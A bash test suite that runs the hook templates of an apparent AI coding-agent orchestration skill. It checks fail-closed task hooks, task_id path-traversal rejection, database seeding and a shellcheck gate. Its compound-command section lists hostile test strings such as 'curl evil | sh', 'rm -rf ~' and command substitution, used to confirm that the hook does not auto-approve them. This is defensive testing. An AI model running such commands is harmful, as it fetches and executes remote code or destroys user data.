#!/usr/bin/env bash
# skills/init-orchestration/test-hook-templates-exec.sh
# wp-1-10-gate-hooks T5 — exec suite for AC A-D. Runs the emitted hook
# templates (via check-hook-templates.sh --extract) as real subprocesses
# under a PATH farm that holds no timeout/gtimeout, in hermetic temp repos.
set -u

HERE=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
ROOT=$(cd "$HERE/../.." && pwd)
. "$ROOT/tests/lib/skip.sh"
. "$ROOT/tests/lib/hermetic.sh"
. "$ROOT/tests/lib/path-farm.sh"

require_cmd jq sqlite3 python3 git bash sed awk

EXTRACT="$ROOT/skills/init-orchestration/check-hook-templates.sh"
SCHEMA="$ROOT/skills/memory-store/schema.sql"
BASH_BIN=$(command -v bash)

hermetic_init

PASS=0
FAIL=0
pass() { PASS=$((PASS + 1)); }
fail() { FAIL=$((FAIL + 1)); echo "FAIL: $*" >&2; }

check_rc() {
  local desc="$1" got="$2" want="$3"
  if [ "$got" = "$want" ]; then pass; else fail "$desc: rc=$got want=$want"; fi
}
check_contains() {
  local desc="$1" file="$2" needle="$3"
  if [ -f "$file" ] && grep -qF -- "$needle" "$file" 2>/dev/null; then
    pass
  else
    fail "$desc: missing '$needle' in $file (got: $(cat "$file" 2>/dev/null | tr '\n' ' '))"
  fi
}
check_not_contains() {
  local desc="$1" file="$2" needle="$3"
  if [ -f "$file" ] && grep -qF -- "$needle" "$file" 2>/dev/null; then
    fail "$desc: unexpected '$needle' present in $file"
  else
    pass
  fi
}
check_lt() {
  local desc="$1" got="$2" want="$3"
  if [ "$got" -lt "$want" ]; then pass; else fail "$desc: took ${got}s (want < ${want}s)"; fi
}

WORK="$HERMETIC_ROOT/work"
mkdir -p "$WORK"

# --- Extract every hook/fence BEFORE narrowing PATH (extraction itself needs
# the real PATH: python3, sed, bash -n, etc.) ---------------------------------
HOOKS="task-completed stop-review memory-capture bash-compress precompact-rescue rescue-pointer friction-capture escalation-gate"
mkdir -p "$WORK/hooks"
EXTRACT_FAIL=0
for name in $HOOKS tdd-gate; do
  if ! bash "$EXTRACT" --extract "$name" > "$WORK/hooks/${name}.sh" 2>"$WORK/hooks/${name}.extract.err"; then
    fail "extract '$name' failed: $(cat "$WORK/hooks/${name}.extract.err")"
    EXTRACT_FAIL=1
  else
    pass
    chmod +x "$WORK/hooks/${name}.sh"
  fi
done

bash "$EXTRACT" --extract seed-db > "$WORK/seed-db.sh" 2>"$WORK/seed-db.extract.err"
check_rc "extract seed-db rc" "$?" "0"
bash "$EXTRACT" --extract seed-baseline > "$WORK/seed-baseline.md" 2>"$WORK/seed-baseline.extract.err"
check_rc "extract seed-baseline rc" "$?" "0"

TC_HOOK="$WORK/hooks/task-completed.sh"
MC_HOOK="$WORK/hooks/memory-capture.sh"
SR_HOOK="$WORK/hooks/stop-review.sh"
BC_HOOK="$WORK/hooks/bash-compress.sh"

# --- --extract error paths (C1) ----------------------------------------------
bash "$EXTRACT" --extract does-not-exist >/dev/null 2>"$WORK/unknown.err"
check_rc "extract unknown name rc" "$?" "64"

# --- Farm a PATH with no timeout/gtimeout (AC A) ------------------------------
FARM="$HERMETIC_ROOT/farm"
path_farm "$FARM" bash git jq sqlite3 head cat printf mkdir rm mv cp cksum cut basename \
  dirname tr sed awk date find grep wc mktemp chmod ln python3 yes sort tail
FARM_RC=$?
check_rc "path_farm (no timeout requested) rc" "$FARM_RC" "0"
export PATH="$FARM"
if command -v timeout >/dev/null 2>&1; then
  fail "timeout resolvable under farmed PATH"
else
  pass
fi
if command -v gtimeout >/dev/null 2>&1; then
  fail "gtimeout resolvable under farmed PATH"
else
  pass
fi

new_repo() {
  local dir="$1"
  mkdir -p "$dir/.claude/tasks"
  ( cd "$dir" && git init -q )
}

write_task() {
  # write_task DIR NAME REQUIRES_COUNCIL STATUS
  local dir="$1" name="$2" rc="$3" status="$4"
  cat > "$dir/.claude/tasks/${name}.json" <<JSON
{"requires_council": ${rc}, "status": "${status}"}
JSON
}

######################################################################
# AC A — fail-closed task-completed, memory-capture, stop-review
######################################################################

A_REPO="$WORK/case-a"
new_repo "$A_REPO"
write_task "$A_REPO" "T1" "true" "in_progress"

printf '%s' '{"task_id":"T1"}' > "$WORK/a1.stdin"
( cd "$A_REPO" && unset CLAUDE_TASK_ID && "$BASH_BIN" "$TC_HOOK" < "$WORK/a1.stdin" \
  > "$WORK/a1.out" 2>"$WORK/a1.err" )
check_rc "A: T1 index missing rc" "$?" "2"
check_contains "A: T1 index missing stderr" "$WORK/a1.err" "council index missing"

SECONDS=0
( cd "$A_REPO" && unset CLAUDE_TASK_ID && "$BASH_BIN" "$TC_HOOK" 0<&- \
  > "$WORK/a2.out" 2>"$WORK/a2.err" )
RC2=$?
EL2=$SECONDS
check_rc "A: closed stdin rc" "$RC2" "2"
check_contains "A: closed stdin stderr" "$WORK/a2.err" "cannot read hook stdin"
check_lt "A: closed stdin timing" "$EL2" "2"

yes x 2>/dev/null | head -c 1100000 > "$WORK/a3.stdin"
( cd "$A_REPO" && unset CLAUDE_TASK_ID && "$BASH_BIN" "$TC_HOOK" < "$WORK/a3.stdin" \
  > "$WORK/a3.out" 2>"$WORK/a3.err" )
check_rc "A: >1MiB stdin rc" "$?" "2"
check_contains "A: >1MiB stdin stderr" "$WORK/a3.err" "cannot read hook stdin"

SECONDS=0
( cd "$A_REPO" && unset CLAUDE_TASK_ID && "$BASH_BIN" "$TC_HOOK" < /dev/null \
  > "$WORK/a4.out" 2>"$WORK/a4.err" )
RC4=$?
EL4=$SECONDS
check_rc "A: /dev/null stdin rc (regression)" "$RC4" "0"
check_lt "A: /dev/null stdin timing" "$EL4" "2"

# memory-capture: Write /x/a.go adds exactly one row
MC_REPO="$WORK/case-a-mc"
mkdir -p "$MC_REPO/.claude/memory"
( cd "$MC_REPO" && git init -q )
MC_DB="$MC_REPO/.claude/memory/memory.db"
sqlite3 "$MC_DB" < "$SCHEMA" >/dev/null 2>&1
jq -n '{"tool_name":"Write","tool_input":{"file_path":"/x/a.go"}}' > "$WORK/mc1.stdin"
( cd "$MC_REPO" && "$BASH_BIN" "$MC_HOOK" < "$WORK/mc1.stdin" > "$WORK/mc1.out" 2>"$WORK/mc1.err" )
check_rc "A: memory-capture Write rc" "$?" "0"
MC_COUNT=$(sqlite3 "$MC_DB" "SELECT COUNT(*) FROM memories;" 2>/dev/null || echo "err")
if [ "$MC_COUNT" = "1" ]; then pass; else fail "A: memory-capture row count=$MC_COUNT want 1"; fi
MC_CONTENT=$(sqlite3 "$MC_DB" "SELECT content FROM memories LIMIT 1;" 2>/dev/null || echo "err")
if [ "$MC_CONTENT" = "write /x/a.go" ]; then pass; else fail "A: memory-capture content='$MC_CONTENT' want 'write /x/a.go'"; fi

# memory-capture: closed stdin adds no row (fresh repo/db)
MC_REPO2="$WORK/case-a-mc2"
mkdir -p "$MC_REPO2/.claude/memory"
( cd "$MC_REPO2" && git init -q )
MC_DB2="$MC_REPO2/.claude/memory/memory.db"
sqlite3 "$MC_DB2" < "$SCHEMA" >/dev/null 2>&1
( cd "$MC_REPO2" && "$BASH_BIN" "$MC_HOOK" 0<&- > "$WORK/mc2.out" 2>"$WORK/mc2.err" )
check_rc "A: memory-capture closed stdin rc" "$?" "0"
MC_COUNT2=$(sqlite3 "$MC_DB2" "SELECT COUNT(*) FROM memories;" 2>/dev/null || echo "err")
if [ "$MC_COUNT2" = "0" ]; then pass; else fail "A: memory-capture closed-stdin row count=$MC_COUNT2 want 0"; fi

# stop-review: dirty repo exits 0
SR_REPO="$WORK/case-a-sr"
mkdir -p "$SR_REPO"
( cd "$SR_REPO" && git init -q && echo "one" > f.txt && git add f.txt \
  && git commit -q -m init && echo "two" >> f.txt )
( cd "$SR_REPO" && "$BASH_BIN" "$SR_HOOK" 0<&- > "$WORK/sr1.out" 2>"$WORK/sr1.err" )
check_rc "A: stop-review dirty repo rc" "$?" "0"

# Static: no non-comment line of any of the 8 HOOKS matches g?timeout ERE
TIMEOUT_ERE='(^|[[:space:];&|(])g?timeout[[:space:]]'
for name in $HOOKS; do
  body="$WORK/hooks/${name}.sh"
  if awk '$0 !~ /^[[:space:]]*#/' "$body" | grep -Eq "$TIMEOUT_ERE"; then
    fail "A: '$name' body matches timeout ERE"
  else
    pass
  fi
done

# Static: no hook body holds bash-4-only constructs
for name in $HOOKS; do
  body="$WORK/hooks/${name}.sh"
  for tok in ',,}' '^^}' 'declare -A' 'declare -n' 'local -n' 'mapfile' 'readarray' '&>>' '|&'; do
    if grep -qF -- "$tok" "$body" 2>/dev/null; then
      fail "A: '$name' body holds forbidden token '$tok'"
    else
      pass
    fi
  done
done

######################################################################
# AC B — task_id validation and candidate filter
######################################################################

B_REPO="$WORK/case-b"
new_repo "$B_REPO"
cat > "$B_REPO/.claude/x.json" <<'JSON'
{"requires_council": false}
JSON

printf '%s' '{"task_id":"../x"}' > "$WORK/b1.stdin"
( cd "$B_REPO" && unset CLAUDE_TASK_ID && "$BASH_BIN" "$TC_HOOK" < "$WORK/b1.stdin" \
  > "$WORK/b1.out" 2>"$WORK/b1.err" )
check_rc "B: ../x task_id rc" "$?" "2"
check_contains "B: ../x task_id stderr" "$WORK/b1.err" "invalid task_id"

( cd "$B_REPO" && CLAUDE_TASK_ID='a/b' "$BASH_BIN" "$TC_HOOK" < /dev/null \
  > "$WORK/b2.out" 2>"$WORK/b2.err" )
check_rc "B: CLAUDE_TASK_ID=a/b rc" "$?" "2"
check_contains "B: CLAUDE_TASK_ID=a/b stderr" "$WORK/b2.err" "invalid task_id"

B3_REPO="$WORK/case-b3"
new_repo "$B3_REPO"
write_task "$B3_REPO" "OLD-3" "true" "completed"
write_task "$B3_REPO" "NEW-3" "false" "in_progress"
printf '%s' '{"task_id":"3"}' > "$WORK/b3.stdin"
( cd "$B3_REPO" && unset CLAUDE_TASK_ID && "$BASH_BIN" "$TC_HOOK" < "$WORK/b3.stdin" \
  > "$WORK/b3.out" 2>"$WORK/b3.err" )
check_rc "B: OLD-3 completed + NEW-3 in_progress rc" "$?" "0"

B4_REPO="$WORK/case-b4"
new_repo "$B4_REPO"
write_task "$B4_REPO" "OLD-3" "true" "completed"
printf '%s' '{"task_id":"3"}' > "$WORK/b4.stdin"
( cd "$B4_REPO" && unset CLAUDE_TASK_ID && "$BASH_BIN" "$TC_HOOK" < "$WORK/b4.stdin" \
  > "$WORK/b4.out" 2>"$WORK/b4.err" )
check_rc "B: OLD-3 completed alone rc" "$?" "2"

B5_REPO="$WORK/case-b5"
new_repo "$B5_REPO"
write_task "$B5_REPO" "OLD-3" "true" "in_progress"
write_task "$B5_REPO" "NEW-3" "false" "in_progress"
printf '%s' '{"task_id":"3"}' > "$WORK/b5.stdin"
( cd "$B5_REPO" && unset CLAUDE_TASK_ID && CLAUDE_TICKET=NEW "$BASH_BIN" "$TC_HOOK" \
  < "$WORK/b5.stdin" > "$WORK/b5a.out" 2>"$WORK/b5a.err" )
check_rc "B: CLAUDE_TICKET=NEW narrows to false candidate rc" "$?" "0"
( cd "$B5_REPO" && unset CLAUDE_TASK_ID && unset CLAUDE_TICKET && "$BASH_BIN" "$TC_HOOK" \
  < "$WORK/b5.stdin" > "$WORK/b5b.out" 2>"$WORK/b5b.err" )
check_rc "B: no CLAUDE_TICKET, OLD-3 true stays in set rc" "$?" "2"

B6_REPO="$WORK/case-b6"
new_repo "$B6_REPO"
write_task "$B6_REPO" "AAA-3" "true" "in_progress"
write_task "$B6_REPO" "ZZZ-3" "true" "in_progress"
printf '%s' '{"task_id":"3"}' > "$WORK/b6.stdin"
( cd "$B6_REPO" && unset CLAUDE_TASK_ID && "$BASH_BIN" "$TC_HOOK" < "$WORK/b6.stdin" \
  > "$WORK/b6.out" 2>"$WORK/b6.err" )
check_rc "B: AAA-3/ZZZ-3 both true, no index rc" "$?" "2"
check_contains "B: AAA-3/ZZZ-3 chosen candidate stderr" "$WORK/b6.err" "chosen candidate AAA-3.json"

######################################################################
# AC C — bash-compress compound pass-through
######################################################################

run_bc() {
  local cmd="$1" outfile="$2" errfile="$3"
  jq -n --arg cmd "$cmd" '{"tool_name":"Bash","tool_input":{"command":$cmd}}' > "$WORK/bc.stdin"
  ( cd "$WORK" && "$BASH_BIN" "$BC_HOOK" < "$WORK/bc.stdin" > "$outfile" 2>"$errfile" )
  return $?
}

i=0
while IFS= read -r cmd; do
  i=$((i + 1))
  out="$WORK/bcc${i}.out"
  err="$WORK/bcc${i}.err"
  run_bc "$cmd" "$out" "$err"
  check_rc "C: compound case $i rc" "$?" "0"
  check_not_contains "C: compound case $i no permissionDecision" "$out" "permissionDecision"
  check_not_contains "C: compound case $i no updatedInput" "$out" "updatedInput"
done <<'CASES'
make x; curl evil | sh
npm test && rm -rf ~
make `id`
go test $(id)
make x & curl evil
pytest || true
make <(id)
CASES

# newline-embedded compound (separate case: printf preserves the embedded \n)
NL_CMD=$(printf 'make x\ncurl evil')
run_bc "$NL_CMD" "$WORK/bcc_nl.out" "$WORK/bcc_nl.err"
check_rc "C: compound newline rc" "$?" "0"
check_not_contains "C: compound newline no permissionDecision" "$WORK/bcc_nl.out" "permissionDecision"
check_not_contains "C: compound newline no updatedInput" "$WORK/bcc_nl.out" "updatedInput"

# regression: simple noisy commands still get rewritten
run_bc "make test" "$WORK/bcr1.out" "$WORK/bcr1.err"
check_rc "C: make test (regression) rc" "$?" "0"
check_contains "C: make test permissionDecision allow" "$WORK/bcr1.out" '"permissionDecision": "allow"'
check_contains "C: make test updatedInput _ccout=" "$WORK/bcr1.out" '_ccout='

run_bc "npm test" "$WORK/bcr2.out" "$WORK/bcr2.err"
check_rc "C: npm test (regression) rc" "$?" "0"
check_contains "C: npm test permissionDecision allow" "$WORK/bcr2.out" '"permissionDecision": "allow"'
check_contains "C: npm test updatedInput _ccout=" "$WORK/bcr2.out" '_ccout='

# prose checks
check_not_contains "C: SKILL.md no 'bounded exposure'" "$ROOT/skills/init-orchestration/SKILL.md" "bounded exposure"
check_not_contains "C: SKILL.md no 'bounded NOISY allowlist only'" "$ROOT/skills/init-orchestration/SKILL.md" "bounded NOISY allowlist only"

BATCH_BLOCK=$(grep -A3 'Write .claude/hooks/bash-compress.sh (PreToolUse' "$ROOT/skills/init-orchestration/SKILL.md")
if [ -n "$BATCH_BLOCK" ] && printf '%s' "$BATCH_BLOCK" | grep -q 'compound'; then
  pass
else
  fail "C: permission-batching bash-compress.sh item missing 'compound' (found: ${BATCH_BLOCK:-<none>})"
fi

PRECOND_BLOCK=$(awk '/Precondition \(CDT-68\)/,/^$/' "$ROOT/skills/init-orchestration/SKILL.md")
if printf '%s' "$PRECOND_BLOCK" | grep -q 'compound'; then
  pass
else
  fail "C: Step 4d Precondition paragraph missing 'compound'"
fi

REGRANT_HIT=0
REGRANT_WINDOWS=""
REGRANT_LINENOS=$(grep -n 're-grant' "$WORK/hooks/bash-compress.sh" | cut -d: -f1)
for ln in $REGRANT_LINENOS; do
  win=$(sed -n "$((ln - 1)),$((ln + 1))p" "$WORK/hooks/bash-compress.sh")
  REGRANT_WINDOWS="$REGRANT_WINDOWS
---
$win"
  if printf '%s' "$win" | grep -q 'compound'; then
    REGRANT_HIT=1
  fi
done
if [ -z "$REGRANT_LINENOS" ]; then
  fail "C: no template comment line holds 're-grant'"
elif [ "$REGRANT_HIT" -eq 1 ]; then
  pass
else
  fail "C: 're-grant' comment paragraph(s) missing 'compound' (windows:$REGRANT_WINDOWS)"
fi

######################################################################
# AC D — Step 7 seed fence (PROJ_ROOT, refuses empty seed)
######################################################################

D_MAIN="$WORK/case-d-main"
mkdir -p "$D_MAIN"
( cd "$D_MAIN" && git init -q && echo "init" > README && git add README \
  && git commit -q -m init )
D_WT="$WORK/case-d-wt"
( cd "$D_MAIN" && git worktree add -q -b case-d-branch "$D_WT" >/dev/null 2>&1 )

mkdir -p "$D_WT/.claude/memory/claude" "$D_MAIN/.claude/memory"

WT_DB="$D_WT/.claude/memory/memory.db"
sqlite3 "$WT_DB" < "$SCHEMA" >/dev/null 2>&1
sqlite3 "$WT_DB" "INSERT INTO memories(agent, type, content) VALUES ('claude', 'memory', 'OLD baseline seeded by /setup orchestration OLD');" >/dev/null 2>&1

MAIN_DB="$D_MAIN/.claude/memory/memory.db"
sqlite3 "$MAIN_DB" < "$SCHEMA" >/dev/null 2>&1
sqlite3 "$MAIN_DB" "INSERT INTO memories(agent, type, content) VALUES ('claude', 'memory', 'main checkout untouched marker');" >/dev/null 2>&1

cp "$WORK/seed-baseline.md" "$D_WT/.claude/memory/claude/.seed-baseline.md"

( cd "$D_WT" && "$BASH_BIN" "$WORK/seed-db.sh" > "$WORK/d1.out" 2>"$WORK/d1.err" )
check_rc "D: seed-db first run rc" "$?" "0"

WT_COUNT1=$(sqlite3 "$WT_DB" "SELECT COUNT(*) FROM memories;" 2>/dev/null || echo err)
if [ "$WT_COUNT1" = "1" ]; then pass; else fail "D: worktree DB row count after run1=$WT_COUNT1 want 1"; fi

WT_CONTENT1=$(sqlite3 "$WT_DB" "SELECT content FROM memories LIMIT 1;" 2>/dev/null || echo err)
BASELINE_TRIMMED=$(cat "$WORK/seed-baseline.md")
if [ "$WT_CONTENT1" = "$BASELINE_TRIMMED" ]; then
  pass
else
  fail "D: worktree DB row content mismatch after run1"
fi

if [ -f "$D_WT/.claude/memory/claude/.seed-baseline.md" ]; then
  fail "D: seed file still present after run1"
else
  pass
fi

MAIN_COUNT1=$(sqlite3 "$MAIN_DB" "SELECT COUNT(*) FROM memories;" 2>/dev/null || echo err)
if [ "$MAIN_COUNT1" = "1" ]; then pass; else fail "D: main checkout DB row count changed=$MAIN_COUNT1 want 1"; fi
MAIN_CONTENT1=$(sqlite3 "$MAIN_DB" "SELECT content FROM memories LIMIT 1;" 2>/dev/null || echo err)
if [ "$MAIN_CONTENT1" = "main checkout untouched marker" ]; then
  pass
else
  fail "D: main checkout DB row content changed: $MAIN_CONTENT1"
fi

check_not_contains "D: seed-db fence has no --git-common-dir" "$WORK/seed-db.sh" "--git-common-dir"

# Second run with a fresh seed file: still exactly one row.
cp "$WORK/seed-baseline.md" "$D_WT/.claude/memory/claude/.seed-baseline.md"
( cd "$D_WT" && "$BASH_BIN" "$WORK/seed-db.sh" > "$WORK/d2.out" 2>"$WORK/d2.err" )
check_rc "D: seed-db second run rc" "$?" "0"
WT_COUNT2=$(sqlite3 "$WT_DB" "SELECT COUNT(*) FROM memories;" 2>/dev/null || echo err)
if [ "$WT_COUNT2" = "1" ]; then pass; else fail "D: worktree DB row count after run2=$WT_COUNT2 want 1"; fi

# Zero-byte seed file: fence refuses, old row untouched.
: > "$D_WT/.claude/memory/claude/.seed-baseline.md"
( cd "$D_WT" && "$BASH_BIN" "$WORK/seed-db.sh" > "$WORK/d3.out" 2>"$WORK/d3.err" )
RC3=$?
if [ "$RC3" -ne 0 ]; then pass; else fail "D: zero-byte seed rc=$RC3 want non-zero"; fi
check_contains "D: zero-byte seed stderr 'empty seed'" "$WORK/d3.err" "empty seed"
WT_COUNT3=$(sqlite3 "$WT_DB" "SELECT COUNT(*) FROM memories;" 2>/dev/null || echo err)
if [ "$WT_COUNT3" = "1" ]; then pass; else fail "D: worktree DB row count after zero-byte run=$WT_COUNT3 want 1 (untouched)"; fi

# Failed insert (MEMDB is a directory): the fence must exit non-zero and keep
# the seed file so the operator can retry.
D_FAIL="$WORK/case-d-fail"
mkdir -p "$D_FAIL/.claude/memory/claude" "$D_FAIL/.claude/memory/memory.db"
( cd "$D_FAIL" && git init -q )
cp "$WORK/seed-baseline.md" "$D_FAIL/.claude/memory/claude/.seed-baseline.md"
( cd "$D_FAIL" && "$BASH_BIN" "$WORK/seed-db.sh" > "$WORK/d4.out" 2>"$WORK/d4.err" )
RC4=$?
if [ "$RC4" -ne 0 ]; then pass; else fail "D: failed insert rc=$RC4 want non-zero"; fi
if [ -f "$D_FAIL/.claude/memory/claude/.seed-baseline.md" ]; then
  pass
else
  fail "D: seed file removed after a failed insert (want kept for retry)"
fi

######################################################################
# check-hook-templates.sh failure message names the real template source
######################################################################

G_ROOT="$WORK/case-g"
mkdir -p "$G_ROOT/skills/init-orchestration" "$G_ROOT/commands"
cp "$ROOT/skills/init-orchestration/check-hook-templates.sh" "$G_ROOT/skills/init-orchestration/"
cp "$ROOT/skills/init-orchestration/SKILL.md" "$G_ROOT/skills/init-orchestration/"
: > "$G_ROOT/commands/tdd-gate.md"
"$BASH_BIN" "$G_ROOT/skills/init-orchestration/check-hook-templates.sh" > "$WORK/g1.out" 2>"$WORK/g1.err"
RCG=$?
if [ "$RCG" -ne 0 ]; then pass; else fail "G: broken tdd-gate.md rc=$RCG want non-zero"; fi
check_contains "G: tdd-gate failure names commands/tdd-gate.md" "$WORK/g1.err" "for 'tdd-gate' from commands/tdd-gate.md"
check_not_contains "G: tdd-gate failure does not blame SKILL.md" "$WORK/g1.err" "for 'tdd-gate' from SKILL.md"

######################################################################
# CDT-286 [06 E4]: the template shellcheck pass. shellcheck is rare, so
# the three behaviors are driven through PATH shims: absent -> stderr
# note + OK; present + findings -> rc 1 naming "<name> (shellcheck)";
# present + clean -> plain OK. The farm below holds every binary the
# gate and its python3 extractor need and NO shellcheck.
######################################################################

GATE="$ROOT/skills/init-orchestration/check-hook-templates.sh"
GATE_FARM="$WORK/sc-farm"
path_farm "$GATE_FARM" bash sh python3 sed awk cat mktemp rm chmod dirname basename grep find ls env tr sort head
[ "$?" -eq 0 ] || fail "sc: path_farm refused a non-shellcheck command"

sc_shim() { # sc_shim <dir> <body>
  local d=$1
  mkdir -p "$d"
  { printf '#!/bin/sh\n'; printf '%b\n' "$2"; } > "$d/shellcheck"
  chmod +x "$d/shellcheck"
}

SC_OUT="$WORK/sc.out"
# H: absent -> OK + note (the farm holds no shellcheck)
"$BASH_BIN" "$GATE" > "$SC_OUT" 2> "$WORK/h.err"; RCH=$?
check_rc "H: shellcheck absent rc" "$RCH" "0"
check_contains "H: fail-open note" "$WORK/h.err" "note: shellcheck not installed"
check_contains "H: OK contract kept" "$SC_OUT" "templates extractable + bash -n clean"

# I: present, findings -> rc 1, template named
I_SHIM="$WORK/sc-fail-shim"
sc_shim "$I_SHIM" 'echo "x.sh:1:1: error: planted finding"; exit 1'
PATH="$GATE_FARM:$I_SHIM" "$BASH_BIN" "$GATE" > "$WORK/i.out" 2> "$WORK/i.err"; RCI=$?
check_rc "I: shellcheck findings rc" "$RCI" "1"
check_contains "I: names the sub-rule" "$WORK/i.err" "(shellcheck)"
check_contains "I: names the template" "$WORK/i.err" "fails shellcheck --shell=bash"

# J: present, clean -> OK, no note
J_SHIM="$WORK/sc-pass-shim"
sc_shim "$J_SHIM" 'exit 0'
PATH="$GATE_FARM:$J_SHIM" "$BASH_BIN" "$GATE" > "$WORK/j.out" 2> "$WORK/j.err"; RCJ=$?
check_rc "J: shellcheck clean rc" "$RCJ" "0"
check_contains "J: OK contract kept" "$WORK/j.out" "templates extractable + bash -n clean"
check_not_contains "J: no fail-open note when present" "$WORK/j.err" "shellcheck not installed"

echo
echo "PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ]
